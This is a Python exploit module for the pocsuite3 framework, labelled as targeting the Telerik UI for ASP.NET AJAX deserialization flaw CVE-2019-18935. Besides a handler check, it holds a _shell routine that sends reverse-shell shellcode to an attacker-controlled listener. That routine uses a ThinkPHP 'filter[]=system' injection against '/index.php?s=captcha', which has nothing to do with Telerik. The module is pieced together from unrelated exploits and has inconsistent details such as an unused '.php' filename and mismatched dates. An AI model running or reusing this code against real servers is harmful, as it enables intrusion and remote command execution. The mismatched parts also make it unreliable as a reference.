
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, get_listener_ip, get_listener_port, VUL_TYPE, POC_SCAN
from pocsuite3.lib.core.enums import OS_ARCH, OS
from pocsuite3.lib.utils import random_str, generate_shellcode_list
from pocsuite3.init_pocs.cve_2019_18935.RAU_crypto import check_cve_rau

class DemoPOC(POCBase):
    vulID = '201918935'  # ssvid
    version = '1.0'
    author = ['noperator', 'asdcxsd']
    vulDate = '2019-1-11'
    createDate = '2019-1-11'
    updateDate = '2019-1-11'
    references = ['https://github.com/noperator/CVE-2019-18935']
    name = 'Telerik UI for ASP.NET AJAX - .NET deserialization vulnerability CVE-2019-18935'
    appPowerLink =  {"typescan" : POC_SCAN.EXPLOITS.DIR,
                "language"  : [POC_SCAN.LANGUAGE.ASP]}
    appName = 'telerik_cve_2019_18935'
    appVersion = 'telerik2019.3.1023'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''Progress Telerik UI for ASP.NET AJAX through 2019.3.1023 contains a .NET deserialization vulnerability in the RadAsyncUpload function. This is exploitable when the encryption keys are known due to the presence of CVE-2017-11317 or CVE-2017-11357, or other means. Exploitation can result in remote code execution. (As of 2020.1.114, a default setting prevents the exploit. In 2019.3.1023, but not earlier versions, a non-default setting can prevent exploitation.)'''
    samples = []
    pocDesc = ''''''
  
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    
    def _check(self, url):
        flag = 'RadAsyncUpload handler is registered succesfully'
        data = ''
        payloads = [
            r"/Telerik.Web.UI.WebResource.axd?type=rau"
        ]
        for payload in payloads:
            vul_url = url + payload
    
            r = requests.get(vul_url)

            if flag in r.text:
                return payload, data
        return False

    def _verify(self):
        result = {}
        p = self._check(self.url)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
            result['VerifyInfo']['Postdata'] = p[1]

        return self.parse_output(result)

    def _attack(self):
        result = {}
        filename = random_str(6) + ".php"
        VERSION, DATA   = check_cve_rau(self.url);
        if VERSION != None:
            result['telerik'] = {}
            result['telerik']['version'] = VERSION
            result['telerik']['data'] = DATA
            
        return self.parse_output(result)

    def _shell(self):
        vulurl = self.url + "/index.php?s=captcha"
    
        _list = generate_shellcode_list(listener_ip=get_listener_ip(), listener_port=get_listener_port(),
                                        os_target=OS.LINUX,
                                        os_target_arch=OS_ARCH.X86)
        for i in _list:
            data = {
                '_method': '__construct',
                'filter[]': 'system',
                'method': 'get',
                'server[REQUEST_METHOD]': i
            }
            headers = {
                "Content-Type": "application/x-www-form-urlencoded"
            }
            requests.post(vulurl, data=data, headers=headers)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
